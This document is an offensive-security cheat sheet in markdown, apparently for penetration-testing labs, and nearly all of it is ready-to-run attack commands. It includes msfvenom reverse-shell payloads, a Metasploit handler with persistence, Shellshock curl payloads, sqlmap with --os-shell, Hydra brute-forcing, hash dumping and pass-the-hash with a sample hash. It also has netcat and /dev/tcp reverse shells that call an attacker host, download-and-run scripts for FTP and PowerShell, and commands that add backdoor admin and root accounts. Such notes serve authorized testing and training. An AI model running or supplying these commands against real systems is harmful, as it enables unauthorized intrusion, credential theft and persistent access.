Infrastructure help
=======

  * [Infrastructure help](#infrastructure-help)
    * [Enumeration](#enumeration)
      * [Arp Scan](#arp-scan)
      * [Ping Sweep](#ping-sweep)
      * [Port Scan](#port-scan)
      * [Web](#web)
      * [SMB](#smb)
      * [SNMP](#snmp)
      * [NSE scripts](#nse-scripts)
    * [Exploitation](#exploitation)
      * [Compiling exploits](#compiling-exploits)
      * [Binaries/shellcode](#binariesshellcode)
      * [SQL Injection](#sql-injection)
      * [Shellshock](#shellshock)
    * [Password attacks](#password-attacks)
      * [Bruteforce or dictionary](#bruteforce-or-dictionary)
      * [Password / hash dump](#password--hash-dump)
      * [Pass the hash](#pass-the-hash)
    * [Post Exploitation](#post-exploitation)
      * [Reverse shells](#reverse-shells)
      * [File transfer](#file-transfer)
      * [Add User](#add-user)
    * [Privilege Escalation](#privilege-escalation)
      * [Windows](#windows)
      * [Linux](#linux)
    * [Tunneling](#tunneling)
      * [Remote Port Forward (HOST A - KALI, HOST B - COMPROMISED, HOST C - TARGET )](#remote-port-forward-host-a---kali-host-b---compromised-host-c---target-)
      * [Proxychains](#proxychains)
      * [Local SSH Port Forward](#local-ssh-port-forward)





## Enumeration


### Arp Scan
```bash
netdiscover -i eth1 -r <network>
arp -a -i eth1
```


### Ping Sweep

Bash
```bash
for ip in $(seq 1 254); do ping -c 1 192.168.0.$ip | grep "bytes from" | cut -d" " -f4 |cut -d":" -f1 ; done
```
TODO Windows/PS, Python


### Port Scan

TCP
```bash
nmap -v -sS -sV -Pn -n -p- <host>
```

UDP
```bash
nmap -v -sU -Pn -n --top-ports=25 <host>
```

Netcat traditional
```bash
nc -v -n -z -w1 <host>  1-10000
```

Netcat OpenBSD
```bash
nc -v -n -z -w1 <host>>  1-10000 2>&1 |grep succeed
```


### Web
Looking for common vulns
```bash
nmap -sV -Pn -v -p <ports> --script http-vuln* <host>
```

Dirbusting
```bash
dirb http://<host>/  /usr/share/dirb/wordlists/big.txt -S -r -w
```


### SMB 
```bash
enum4linux -v -a <host>
```

```bash
nmap -sV -Pn -vv -p <ports> --script=smb-check-vulns,smb-psexec,smb-vuln-ms10-054,smb-vuln-ms10-061 --script-args=unsafe=1 <host>
```


### SNMP
```bash
snmpcheck -t <host>
```

### NSE scripts
```bash
ls /usr/share/nmap/scripts/ -l | grep
```
* smb*
* http*

### tcpdump
```bash
sudo tcpdump -i eth0 -nq -s0 -C100 -w audit_`date +"%Y%m%d_%H%M%S"`.pcap
```

## Exploitation

### Compiling exploits

Compiling on Windows 
```bash
gcc -m32 -ggdb -o <output> -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack <input>.c
```
Compiling on Linux
```bash
gcc <input>.c -o <output> -lssl -lcrypt
```
Compiling Windows flavored C on Linux (note missing libraries)
```bash
i586-mingw32msvc-gcc <input>.c -o <output>.exe -lwsock32 -lrpcrt4 -lmpr -lws2_32
```


### Binaries/shellcode

Msfvenom
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -e x86/shikata_ga_nai -a x86 --platform win -b "\x00" > winreverseshell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -e x86/shikata_ga_nai -a x86 --platform win -b "\x00" > winrmeterpretershell.exe
```

Metasploit Listener
```
use exploit/multi/handler
set PAYLOAD <payload>
set LHOST <lhost>
set LPORT <lport>
set ExitOnSession false
exploit -j -z
```

Meterpreter reminders
```
msfdb init
show options advanced
set ExitOnSession false
set AutoRunScript persistence
```

### SQL Injection
```bash
sqlmap -u "http://<host>/index.php" --data="username=admin&password=admin&Submit=Login+In"  --level=5 --risk=3 --time-sec 10  --dbms=mysql --os-shell
```

### Shellshock
```bash
curl -A '() { :;}; echo -en "\r\n\r\n$(echo;/usr/bin/id)\r\n\r\n"' <host>:<port>/cgi-bin/vuln.cgi
curl -i -X OPTIONS -H "User-Agent: () { :;};echo;/usr/bin/id" "http://<host>:<port>/cgi-bin/vuln.cgi"
ssh  noob@<host> '() { :;}; uname -a'
```






## Password attacks

### Bruteforce or dictionary
LM
```bash
rcracki_mt -h <hash> <rainbow>
```

Hydra
```bash
hydra -V -u -o found-ftp.txt -e nsr -L wordlists/users.txt -P wordlists/passwords.txt -s 21 <host> ftp

hydra -V -u -o found-ssh.txt -e nsr -L wordlists/users.txt -P wordlists/passwords.txt -s 22 <host> ssh

hydra -V -u -o found-telnet.txt -e nsr -L wordlists/users.txt -P wordlists/passwords.txt -s 23 <host> telnet

hydra -V -u -o found-snmp.txt -e nsr -P wordlists/snmp.txt <host> snmp
```

John
```bash
john --rules --wordlist=/usr/share/wordlists/rockyou.txt --format=<format from hashid> <hash file>
```

Unshadow
```bash
unshadow /etc/passwd /etc/shadow > unshadowed
```

Hash id (https://github.com/psypanda/hashID)
```bash
hashid.py -j <hash>
```

### Password / hash dump
```
wce -w
PwDump7.exe
```

### Pass the hash
```
pth-winexe  -U bob%254095eef2e2be31f7a83d6fb4b9887b:0d3f32016ee8a42ba768d558875d57e5 //<host> cmd
```






## Post Exploitation

### Reverse shells
Netcat
```
nc -nv <host> <port> -e /bin/bash
nc -nv <host> <port> -e cmd.exe
```

Bash
```
/bin/bash -i >& /dev/tcp/<host>/<port> 0>&1
```

Improve Linux feedback on shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
```

### File transfer

FTP
```
echo open <host> > ftp.txt
echo <user> >> ftp.txt
echo <pass> >> ftp.txt
echo bin >> ftp.txt
echo get nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

Powershell
```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = "http://<host>/accesschk.exe" >> wget.ps1
echo $file = "accesschk.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 
```


### Add User
Windows
```
net user hacker MNB00zxc /add
net localgroup administrators hacker /add
```
Linux
```
/usr/sbin/useradd -g 0 -m -o -u 0 hacker
echo "hacker:123456qwe" | /usr/sbin/chpasswd 
```


## Privilege Escalation

### Windows
Find misconfigured services
```bash
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

Find all weak folder permissions per drive. 
```bash
accesschk.exe /accepteula -uwdqs Users c:\ 
accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\ 
```

Find all weak file permissions per drive. 
```bash
accesschk.exe /accepteula -uwqs Users c:\*.* 
accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
```

### Linux
Find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied) 
```bash
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```

Find passwords in files
```bash
grep -i -r "password" /**/*.php 2>/dev/null
find . -name "*.php" -print0 | xargs -0 grep -i -n "password" 2>/dev/null
```
Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
```
find / -perm -1000 -type d 2>/dev/null
```

SGID (chmod 2000) - run as the group, not the user who started it
```
find / -perm -g=s -type f 2>/dev/null
```

SUID (chmod 4000) - run as the owner, not the user who started it
```
find / -perm -u=s -type f 2>/dev/null
```

SGID or SUID
```
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
```

Sudo list permissions
```bash
sudo -l
```





## Tunneling

### Remote Port Forward (HOST A - KALI, HOST B - COMPROMISED, HOST C - TARGET )
```
COMPROMISED > plink.exe KALI -P 22 -l root -pw rootpass -C -R 3389:TARGET:3389 
```

### Proxychains
```
ssh -D <local_port> -p <ssh_listening_port> hacker@COMPROMISED

proxychains
```

### Local SSH Port Forward
```
ssh -L <local_port>:<target_host>:<target_host_port> hacker@COMPROMISED
```